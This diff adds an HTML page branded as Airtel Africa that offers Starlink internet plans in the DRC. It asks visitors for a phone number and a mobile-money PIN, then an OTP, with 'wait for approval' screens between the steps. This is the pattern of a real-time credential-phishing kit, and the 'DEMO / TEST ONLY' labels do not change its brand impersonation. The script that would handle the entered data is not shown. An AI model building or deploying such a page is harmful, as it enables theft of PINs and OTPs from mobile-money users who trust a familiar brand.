@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>RDC Starlink</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <main class="app">
+
+    <section id="packagePage" class="page active">
+      <header class="starlink-header">
+        <div class="airtel-brand">
+          <div class="airtel-logo">Airtel</div>
+          <div class="airtel-tagline">a leading telecommunications company</div>
+        </div>
+
+        <div class="header-menu" aria-label="Menu">☰</div>
+
+        <div class="header-center">
+          <div class="service-name">STARLINK + Starlink</div>
+          <div class="internet-pill">◉ Internet plans</div>
+          <h1>Stay<br><span>connected</span><br><em>Without Limits</em></h1>
+          <p>Choose a plan. You will be redirected to the Airtel<br>
+             Lite login page to proceed with the payment.</p>
+        </div>
+      </header>
+
+      <div class="plans-title">Internet plans</div>
+
+      <div id="packageList" class="packages"></div>
+
+      <footer class="site-footer">
+        <div>↕ Terms and conditions</div>
+        <div>│</div>
+        <div>▣ Secure payment</div>
+        <div>│</div>
+        <div>▣ 24/7 support</div>
+      </footer>
+
+      <div class="copyright">© 2026 Airtel Africa. All rights reserved.</div>
+    </section>
+
+    <section id="pinPage" class="page">
+      <button id="backButton" class="back" type="button">← Back</button>
+
+      <div class="brand small">
+        <div class="logo">RDC</div>
+        <div>
+          <h1>Connect to Starlink</h1>
+          <p id="selectedPackage"></p>
+        </div>
+      </div>
+
+      <form id="pinForm" class="card" novalidate>
+        <div class="demo-warning">
+          <strong>DEMO / TEST ONLY</strong>
+          <br>
+          Do not enter your real mobile-money PIN, banking PIN, or any real payment credential.
+          Use a test PIN for this demonstration.
+        </div>
+
+        <label for="phone">Phone number</label>
+        <div class="phone-row">
+          <span>+243</span>
+          <input
+            id="phone"
+            type="text"
+            inputmode="numeric"
+            maxlength="9"
+            autocomplete="off"
+            placeholder="912345678"
+            required
+          >
+        </div>
+        <small>Enter exactly 9 digits beginning with 9.</small>
+        <div id="phoneError" class="error"></div>
+
+        <label for="pin">4-digit demo PIN</label>
+        <input
+          id="pin"
+          type="password"
+          inputmode="numeric"
+          maxlength="4"
+          autocomplete="off"
+          placeholder="••••"
+          required
+        >
+        <div id="pinError" class="error"></div>
+
+        <p class="notice">
+          Do not enter personal details other than the information specifically required on this page.
+        </p>
+
+        <button id="submitPin" class="primary" type="submit">Submit</button>
+      </form>
+    </section>
+
+    <section id="waitingPage" class="page">
+      <div class="status-card">
+        <div class="spinner"></div>
+        <h2>Please wait for approval</h2>
+        <p>Your request has been submitted. Please wait while we verify your request.</p>
+        <p id="waitingDetails" class="muted"></p>
+      </div>
+    </section>
+
+    <section id="otpPage" class="page">
+      <div class="brand small">
+        <div class="logo">RDC</div>
+        <div>
+          <h1>OTP Verification</h1>
+          <p id="otpPackage"></p>
+        </div>
+      </div>
+
+      <form id="otpForm" class="card" novalidate>
+        <div class="demo-warning">
+          <strong>DEMO / TEST ONLY</strong>
+          <br>
+          Do not enter a real payment OTP, banking OTP, or any real verification code.
+          Use a test OTP for this demonstration.
+        </div>
+
+        <label for="otp">4-digit demo OTP</label>
+        <input
+          id="otp"
+          type="text"
+          inputmode="numeric"
+          maxlength="4"
+          autocomplete="off"
+          placeholder="••••"
+          required
+        >
+
+        <div id="otpError" class="error"></div>
+
+        <p class="timer-text">
+          OTP request expires in <strong id="timer">60</strong> seconds
+        </p>
+
+        <button id="submitOtp" class="primary" type="submit">Submit OTP</button>
+
+        <button id="requestAnotherOtp" class="secondary hidden" type="button">
+          Request another OTP
+        </button>
+      </form>
+    </section>
+
+    <section id="otpWaitingPage" class="page">
+      <div class="status-card">
+        <div class="spinner"></div>
+        <h2>Please wait for approval</h2>
+        <p>Your OTP request has been submitted. Please wait for approval.</p>
+      </div>
+    </section>
+
+    <section id="successPage" class="page">
+      <div class="success-card">
+        <div class="success-icon">✓</div>
+        <h2>Welcome to RDC Starlink</h2>
+        <p id="successPackage"></p>
+        <p>Your package has been received and your phone is now connected to the internet.</p>
+      </div>
+    </section>
+
+    <section id="errorPage" class="page">
+      <div class="status-card error-card">
+        <h2 id="errorTitle">Request not approved</h2>
+        <p id="errorMessage"></p>
+        <button id="tryAgain" class="primary" type="button">Try again</button>
+      </div>
+    </section>
+
+  </main>
+
+  <script src="script.js"></script>
+</body>
+</html>
